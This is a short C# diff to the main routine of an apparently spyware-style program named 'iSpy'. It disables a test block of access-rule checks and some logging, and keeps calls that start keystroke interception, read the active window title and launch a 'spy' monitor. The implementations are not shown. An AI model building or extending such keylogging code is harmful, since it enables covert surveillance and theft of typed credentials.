@@ -28,34 +28,27 @@ namespace iSpy
 
             // Test rules
             // ************************************************************* TEST *******************************************8
-            bool result = SetEnvironmentcs.CheckAllRules();
+            //bool result = SetEnvironmentcs.CheckAllRules();
 
-            if (!result)
-            {
-                Console.WriteLine("No Access to..." + result.ToString());
-                Console.ReadLine();
-            }
-            else
-            {
-                Console.WriteLine("Access to..." + result.ToString());
-                Console.ReadLine();
-            }
+            //if (!result)
+            //{
+            //    Console.WriteLine("No Access to..." + result.ToString());
+            //    Console.ReadLine();
+            //}
+            //else
+            //{
+            //    Console.WriteLine("Access to..." + result.ToString());
+            //    Console.ReadLine();
+            //}
             // **************************************************************************************************************8
-
-            // 1. Check if a log already ecists.
-            if (!LogService.DoesLogExist())
-                LogService.CreateNewLog();
-
-            
+                                   
             // Start keyCapture()
             Task TStartKeyCapture = Task.Run(() => { InterceptKeys.Main();  });
 
             // Get current active window and start monitoring.
             SetWindowTitle.SetActiveWindowTitle();
             ActivateSpy.StartSpy();
-
-            MessageBox.Show("IS this the VERY end?");
-
+                      
         }
     }
 }
